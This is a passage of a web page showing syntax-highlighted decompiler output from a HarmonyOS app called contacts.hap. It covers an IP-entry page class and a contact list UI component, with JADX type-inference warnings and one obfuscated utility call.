class="number">0</span>&gt;#rerender(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateDirtyElements();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#rerender(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.updateDirtyElements();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#inputIP^<span class="number">1</span>(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__inputIP;</span><br><span class="line">        obj.set(arg0);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&lt;#getEntryName(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;setIP&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#initialRender(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        ldlexvar = _lexenv_0_1_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(#~@<span class="number">0</span>&gt;@<span class="number">1</span>*#, TextInput);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#initialRender(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = <span class="built_in">this</span>;</span><br><span class="line">        ldlexvar = _lexenv_0_1_;</span><br><span class="line">        ldlexvar.observeComponentCreation2(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*#, RelativeContainer);</span><br><span class="line">        ldlexvar2 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar2.observeComponentCreation2(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>, Row);</span><br><span class="line">        ldlexvar3 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar3.observeComponentCreation2(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>, Image);</span><br><span class="line">        ldlexvar4 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar4.observeComponentCreation2(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>, Text);</span><br><span class="line">        Text.pop();</span><br><span class="line">        Row.pop();</span><br><span class="line">        ldlexvar5 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar5.observeComponentCreation2(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">4</span>, Column);</span><br><span class="line">        ldlexvar6 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar6.observeComponentCreation2(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">5</span>, createobjectwithbuffer([<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ipSetComponent&quot;</span>]));</span><br><span class="line">        ldlexvar7 = _lexenv_0_1_;</span><br><span class="line">        ldlexvar7.observeComponentCreation2(#~@<span class="number">2</span>&gt;@<span class="number">1</span>*#^<span class="number">6</span>, Button);</span><br><span class="line">        Button.pop();</span><br><span class="line">        Column.pop();</span><br><span class="line">        RelativeContainer.pop();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Multi-variable type inference failed */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r16v0, types: [&amp;entry/src/main/ets/pages/setIP&amp;] */</span></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r23v36, types: [int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>=#ipSetComponent(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0, Object arg1, Object arg2, Object arg3, Object arg4, Object arg5) &#123;</span><br><span class="line">        obj = arg3;</span><br><span class="line">        obj2 = arg4;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> == obj2 ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj2 = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3 = <span class="built_in">super</span>(arg0, arg2, obj, arg5);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="string">&quot;function&quot;</span> == typeof(obj2) ? <span class="number">1</span> : <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            obj3.paramsGenerator_ = obj2;</span><br><span class="line">        &#125;</span><br><span class="line">        obj3.onTextChange = <span class="number">0</span>;</span><br><span class="line">        obj3.setInitiallyProvidedValue(arg1);</span><br><span class="line">        obj3.finalizeConstruction();</span><br><span class="line">        <span class="keyword">return</span> obj3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#updateStateVars(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#updateStateVars(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#aboutToBeDeleted(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        Get = SubscriberManager.Get();</span><br><span class="line">        Get.delete(<span class="built_in">this</span>.id__());</span><br><span class="line">        <span class="built_in">this</span>.aboutToBeDeletedInternal();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#aboutToBeDeleted(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__inputIP;</span><br><span class="line">        obj.aboutToBeDeleted();</span><br><span class="line">        Get = SubscriberManager.Get();</span><br><span class="line">        Get.delete(<span class="built_in">this</span>.id__());</span><br><span class="line">        <span class="built_in">this</span>.aboutToBeDeletedInternal();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*#onTextChange(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        _lexenv_0_1_.inputIP = arg0;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*#paramsLambda(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>) &#123;</span><br><span class="line">        obj = createobjectwithbuffer([<span class="string">&quot;onTextChange&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj.onTextChange = #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*@<span class="number">3</span>*#onTextChange;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;@<span class="number">1</span>*^<span class="number">5</span>*@<span class="number">3</span>*#onTextChange(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        _lexenv_0_1_.inputIP = arg0;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#setInitiallyProvidedValue(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> != arg0.onTextChange ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.onTextChange = arg0.onTextChange;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#setInitiallyProvidedValue(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="number">0</span> != arg0.inputIP ? <span class="number">1</span> : <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.inputIP = arg0.inputIP;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">2</span>&gt;#purgeVariableDependenciesOnElmtId(Object functionObject, Object newTarget, setIP <span class="built_in">this</span>, Object arg0) &#123;</span><br><span class="line">        obj = <span class="built_in">this</span>.__inputIP;</span><br><span class="line">        obj.purgeDependencyOnElmtId(arg0);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> p001entry/src/main/ets/components;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* renamed from: &amp;entry/src/main/ets/components/UserList&amp;, reason: invalid class name */</span></span><br><span class="line"><span class="comment">/* loaded from: F:\Download\contacts.hap\contacts\ets\modules.abc */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserList</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Object pkgName<span class="meta">@entry</span>;</span><br><span class="line">    <span class="keyword">public</span> Object isCommonjs;</span><br><span class="line">    <span class="keyword">public</span> Object hasTopLevelAwait;</span><br><span class="line">    <span class="keyword">public</span> Object isSharedModule;</span><br><span class="line">    <span class="keyword">public</span> Object scopeNames;</span><br><span class="line">    <span class="keyword">public</span> Object moduleRecordIdx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #*#(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Row.create();</span><br><span class="line">        obj = Row.height;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777291</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Row.width(<span class="keyword">import</span> &#123; StyleConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/StyleConstants&amp;&quot;</span>.FULL_WIDTH);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*#(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Column.create();</span><br><span class="line">        obj = Column.padding;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;bottom&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777286</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj3.params = [Object];</span><br><span class="line">        obj2.bottom = obj3;</span><br><span class="line">        obj(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">1</span>(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = Image.create;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777232</span>, <span class="string">&quot;type&quot;</span>, <span class="number">20000</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj2.params = [Object];</span><br><span class="line">        obj(obj2);</span><br><span class="line">        Image.width(<span class="string">&quot;25vp&quot;</span>);</span><br><span class="line">        obj3 = Image.height;</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777270</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj3(obj4);</span><br><span class="line">        obj5 = Image.margin;</span><br><span class="line">        obj6 = createobjectwithbuffer([<span class="string">&quot;left&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj7 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777271</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj7.params = [Object];</span><br><span class="line">        obj6.left = obj7;</span><br><span class="line">        obj5(obj6);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">2</span>(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        Column.create();</span><br><span class="line">        Column.alignItems(HorizontalAlign.Start);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">1</span>*#^<span class="number">3</span>(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        obj = Text.create;</span><br><span class="line">        utils = <span class="keyword">import</span> &#123; <span class="keyword">default</span> as utils &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/Utils/utils&amp;&quot;</span>;</span><br><span class="line">        obj(utils.o0O0OOoo(_lexenv_0_0_.uid));</span><br><span class="line">        Text.fontColor(Color.Black);</span><br><span class="line">        obj2 = Text.margin;</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;bottom&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj4 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777295</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj4.params = [Object];</span><br><span class="line">        obj3.bottom = obj4;</span><br><span class="line">        obj2(obj3);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object #~@<span class="number">0</span>&gt;@<span class="number">2</span>*#^<span class="number">1</span>(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>, Object arg0, Object arg1) &#123;</span><br><span class="line">        List.create();</span><br><span class="line">        List.width(<span class="keyword">import</span> &#123; StyleConstants &#125; from <span class="string">&quot;@normalized:N&amp;&amp;&amp;entry/src/main/ets/common/constants/StyleConstants&amp;&quot;</span>.FULL_WIDTH);</span><br><span class="line">        List.backgroundColor(Color.White);</span><br><span class="line">        obj = List.margin;</span><br><span class="line">        obj2 = createobjectwithbuffer([<span class="string">&quot;top&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj3 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777285</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj3.params = [Object];</span><br><span class="line">        obj2.top = obj3;</span><br><span class="line">        obj(obj2);</span><br><span class="line">        List.layoutWeight(<span class="number">1</span>);</span><br><span class="line">        obj4 = List.divider;</span><br><span class="line">        obj5 = createobjectwithbuffer([<span class="string">&quot;color&quot;</span>, <span class="number">0</span>, <span class="string">&quot;strokeWidth&quot;</span>, <span class="number">0</span>, <span class="string">&quot;startMargin&quot;</span>, <span class="number">0</span>, <span class="string">&quot;endMargin&quot;</span>, <span class="number">0</span>]);</span><br><span class="line">        obj6 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777239</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10001</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj6.params = [Object];</span><br><span class="line">        obj5.color = obj6;</span><br><span class="line">        obj7 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777325</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj7.params = [Object];</span><br><span class="line">        obj5.strokeWidth = obj7;</span><br><span class="line">        obj8 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777294</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj8.params = [Object];</span><br><span class="line">        obj5.startMargin = obj8;</span><br><span class="line">        obj9 = createobjectwithbuffer([<span class="string">&quot;id&quot;</span>, <span class="number">16777294</span>, <span class="string">&quot;type&quot;</span>, <span class="number">10002</span>, <span class="string">&quot;params&quot;</span>, <span class="number">0</span>, <span class="string">&quot;bundleName&quot;</span>, <span class="string">&quot;com.example.myapplication&quot;</span>, <span class="string">&quot;moduleName&quot;</span>, <span class="string">&quot;entry&quot;</span>]);</span><br><span class="line">        obj9.params = [Object];</span><br><span class="line">        obj5.endMargin = obj9;</span><br><span class="line">        obj4(obj5);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX WARN: Type inference failed for: r15v7, types: [boolean, int] */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">func_main_0</span><span class="params">(Object functionObject, Object newTarget, UserList <span class="built_in">this</span>)</span> &#123;</span><br><span class="line">        newlexenvwithname([<span class="number">2</span>, <span class="string">&quot;4newTarget&quot;</span>, <span class="number">0</span>, <span class="string">&quot;this&quot;</span>, <span class="number">1</span>], <span class="number">2</span>);</span><br><span class="line">        _lexenv_0_0_ = newTarget;</span><br><span class="line">        _lexenv_0_1_ = 